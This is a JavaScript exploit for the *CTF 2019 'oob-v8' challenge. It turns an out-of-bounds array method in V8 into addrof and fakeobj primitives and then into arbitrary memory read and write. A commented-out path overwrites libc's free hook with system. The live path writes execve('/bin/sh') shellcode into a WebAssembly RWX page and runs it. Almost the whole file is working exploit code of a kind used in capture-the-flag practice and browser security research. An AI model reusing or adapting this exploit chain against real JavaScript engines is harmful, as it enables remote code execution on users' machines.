/**
 * Exp for *CTF 2019: oob-v8
 */

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map1 = obj_arr.oob();
var map2 = fl_arr.oob();

function addrof(in_obj) {
    // First, put the obj whose address we want to find into index 0
    obj_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    obj_arr.oob(map2);

    // Get the address by accessing index 0
    let addr = obj_arr[0];

    // Set the map back
    obj_arr.oob(map1);

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    fl_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    fl_arr.oob(map1);

    // Get a "fake" object at that memory location and store it
    let fake = fl_arr[0];

    // Set the map back
    fl_arr.oob(map2);

    // Return the object
    return fake;
}


// // If we want to leak the following string:
// let target_string = "AAAAAAAA";
// let target_string_addr = addrof(target_string);
// console.log("[+] Address of target string: 0x" + target_string_addr.toString(16));
// // %SystemBreak();
// // [+] Address of target string: 0xc6a37f9f3c9
// // (gdb) x/32xw 0xc6a37f9f3c9-1
// // 0xc6a37f9f3c8:	0xd9840461	0x00003369	0xe62bbeea	0x00000008
// // 0xc6a37f9f3d8:	0x41414141	0x41414141	0xd9840461	0x00003369  <-- target_string
// // 0xc6a37f9f3e8:	0xfe1f98a6	0x00000012	0x67726174	0x735f7465

// let floatArray = [1.1, 1.2, 1.3, 1.4];
// let floatArrayMap = floatArray.oob();
// floatArray[0] = floatArrayMap;
// floatArray[2] = itof(BigInt(target_string_addr));
// console.log("[+] Leak address of floatArray: 0x" + addrof(floatArray).toString(16));
// // %SystemBreak();

// // [+] Leak address of floatArray: 0x3dbbd148f619
// // (gdb) x/32xw 0x3dbbd148f619-1-0x30
// // 0x3dbbd148f5e8:	0xd98414f9	0x00003369	0x00000000	0x00000004  <-- FixedDoubleArray
// // 0x3dbbd148f5f8:	0x43142ed9	0x00003fb1	0x33333333	0x3ff33333
// // 0x3dbbd148f608:	0x37f9f3c9	0x00000c6a	0x66666666	0x3ff66666  <-- elements[2]
// // 0x3dbbd148f618:	0x43142ed9	0x00003fb1	0xd9840c71	0x00003369  <-- JSArray
// // 0x3dbbd148f628:	0xd148f5e9	0x00003dbb	0x00000000	0x00000004  <-- elements ptr
// // 0x3dbbd148f638:	0xd9840561	0x00003369	0x43142ed9	0x00003fb1
// // 0x3dbbd148f648:	0xd98412c9	0x00003369	0x00000000	0x00000001
// // 0x3dbbd148f658:	0x00000000	0x00000400	0xd98413b9	0x00003369

// let fakeArray = fakeobj(addrof(floatArray)-0x20n);
// console.log("[+] Leak: 0x" + ftoi(fakeArray[0]).toString(16)); // Leak the value at target_string_addr + 0x10

// console.log("[+] Try to overwrite to this value: " + itof(BigInt(0x4242424242424242)));
// fakeArray[0] = itof(BigInt(0x4242424242424242));
// console.log("[+] Leak fakeArray[0]: " + fakeArray[0]); 
// console.log("[+] Leak target_string: " + target_string)


// This array is what we will use to read from and write to arbitrary memory addresses
var arb_rw_arr = [map2, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // We have to use tagged pointers for reading, so we tag the addr
    if (addr % 2n == 0)
	addr += 1n;

    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to read_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Index 0 will then return the value at read_addr
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to write_addr-0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Write to index 0 as a floating point value
    fake[0] = itof(BigInt(val));
}


function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

/**
 * Exploit 1
 */
// // buf_addr = 0x10163430ddd0
// // v8_heap_base_addr = buf_addr & 0xffffffff0000n
// let buf_addr = addrof(buf);
// let v8_heap_base_addr = buf_addr & 0xffffffff0000n
// let heap_ptr_addr = v8_heap_base_addr + 0x10n;

// let heap_ptr = arb_read(heap_ptr_addr);
// let heap_base_addr = heap_ptr - 0x786D0n;
// console.log("[+] Leak a Heap pointer: 0x" + heap_ptr.toString(16));
// console.log("[+] Heap base address: 0x" + heap_base_addr.toString(16));

// let text_seg_ptr= arb_read(heap_base_addr + 0x2668n);
// let pie_base_addr = text_seg_ptr - 0xBE9B5n;
// console.log("[+] Leak a PIE pointer: 0x" + pie_base_addr.toString(16));

// let puts_got_addr = pie_base_addr + 0xD9A3B8n;
// let puts_addr = arb_read(puts_got_addr);
// let libc_base_addr = puts_addr - 0x80970n;
// console.log("[+] Leak a libc pointer: 0x" + libc_base_addr.toString(16));

// let free_hook_addr = libc_base_addr + 0x3ed8e8n;
// let system_addr = libc_base_addr + 0x4f420n;
// arb_write(free_hook_addr, system_addr);
// %SystemBreak();

// console.log("/bin/sh");

/**
 * Exploit 2
 */

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	    dataview.setUint32(4*i, shellcode[i], true);
    }
}

// reference: https://www.anquanke.com/post/id/267518?hmsr=joyk.com&utm_source=joyk.com&utm_medium=referral#h3-14
var shellcode = [
  0x99583b6a, 0x2fbb4852, 
  0x6e69622f, 0x5368732f,
  0x57525f54, 0x050f5e54
];

copy_shellcode(rwx_page_addr, shellcode);

// %SystemBreak();

f();
